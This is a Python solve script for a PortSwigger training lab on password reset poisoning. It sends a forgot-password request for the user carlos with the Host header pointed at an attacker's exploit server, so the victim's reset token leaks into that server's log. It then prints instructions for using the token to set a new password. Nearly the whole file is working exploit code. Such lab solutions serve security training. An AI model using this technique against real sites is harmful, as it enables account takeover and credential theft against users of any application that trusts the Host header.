#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Basic password reset poisoning.

Submits a password reset for carlos with Host set to the exploit server.
The reset email link points to the exploit server; the token is leaked
in the access log when carlos clicks it.

NOTE: Token retrieval from the access log and final password change must
be done manually — this script only triggers the poisoned reset request.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def poison_reset(lab, exploit_host, username="carlos"):
    headers = {"Host": exploit_host}
    r = requests.post(
        f"{lab}/forgot-password",
        data={"username": username},
        headers=headers,
        verify=False,
        allow_redirects=True,
    )
    print(f"[*] Reset request sent for '{username}' with Host: {exploit_host}")
    print(f"[*] Status: {r.status_code}")
    print(f"\n[!] Check your exploit server access log for:")
    print(f"    GET /forgot-password?temp-forgot-password-token=<TOKEN>")
    print(f"\n[!] Then visit:")
    print(f"    {lab}/forgot-password?temp-forgot-password-token=<TOKEN>")
    print(f"    to set a new password for {username}.")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Host Header Password Reset Poisoning lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("exploit_host", help="Your exploit server hostname (no https://)")
    parser.add_argument("--username", default="carlos")
    args = parser.parse_args()

    poison_reset(args.lab_url.rstrip("/"), args.exploit_host, args.username)


if __name__ == "__main__":
    main()
